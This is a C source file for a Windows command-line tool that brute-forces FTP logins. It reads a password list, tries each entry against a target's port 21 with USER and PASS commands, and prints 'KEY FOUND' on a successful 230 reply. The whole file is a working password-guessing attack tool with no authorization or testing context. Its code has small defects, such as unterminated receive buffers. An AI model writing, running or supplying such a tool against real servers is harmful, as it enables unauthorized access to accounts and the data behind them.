#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

#define MAX_PASSWORD_LEN 128
#define MAX_USERNAME_LEN 128

// Colors for output
#define COLOR_RESET "\033[0m"
#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"

void print_usage() {
    printf("Usage: fmephisto.exe -l username -P passwordlist ftp://ip\n");
}

int try_ftp_login(const char *host, const char *username, const char *password) {
    struct sockaddr_in server;
    SOCKET sock;
    char request[1024], response[1024];

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        return -1;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(21);  // FTP port
    server.sin_addr.s_addr = inet_addr(host);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
        closesocket(sock);
        return -1;
    }

    recv(sock, response, sizeof(response), 0);  // Get the welcome message

    sprintf(request, "USER %s\r\n", username);
    send(sock, request, strlen(request), 0);
    recv(sock, response, sizeof(response), 0);

    sprintf(request, "PASS %s\r\n", password);
    send(sock, request, strlen(request), 0);
    recv(sock, response, sizeof(response), 0);

    if (strstr(response, "230") != NULL) {
        closesocket(sock);
        return 1;  // Success
    }

    closesocket(sock);
    return 0;  // Failed
}

void brute_force_ftp(const char *host, const char *username, const char *passwordlist_file) {
    FILE *file;
    char password[MAX_PASSWORD_LEN];

    file = fopen(passwordlist_file, "r");
    if (file == NULL) {
        printf("Could not open password list.\n");
        return;
    }

    while (fgets(password, sizeof(password), file)) {
        // Remove newline character
        password[strcspn(password, "\n")] = 0;

        printf("TRYING PASSWORD: %s\n", password);

        int result = try_ftp_login(host, username, password);

        if (result == 1) {
            printf(COLOR_GREEN "KEY FOUND: %s\n" COLOR_RESET, password);
            fclose(file);
            return;
        } else if (result == -1) {
            printf("Error connecting to FTP server.\n");
            fclose(file);
            return;
        }

        printf(COLOR_RED "KEY NOT FOUND: %s\n" COLOR_RESET, password);
    }

    fclose(file);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        print_usage();
        return -1;
    }

    char *username = NULL;
    char *passwordlist_file = NULL;
    char *host = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-l") == 0) {
            username = argv[i + 1];
            i++;
        } else if (strcmp(argv[i], "-P") == 0) {
            passwordlist_file = argv[i + 1];
            i++;
        } else if (strncmp(argv[i], "ftp://", 6) == 0) {
            host = argv[i] + 6;  // Skip the "ftp://" part
        }
    }

    if (username == NULL || passwordlist_file == NULL || host == NULL) {
        print_usage();
        return -1;
    }

    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed\n");
        return -1;
    }

    brute_force_ftp(host, username, passwordlist_file);

    WSACleanup();
    return 0;
}
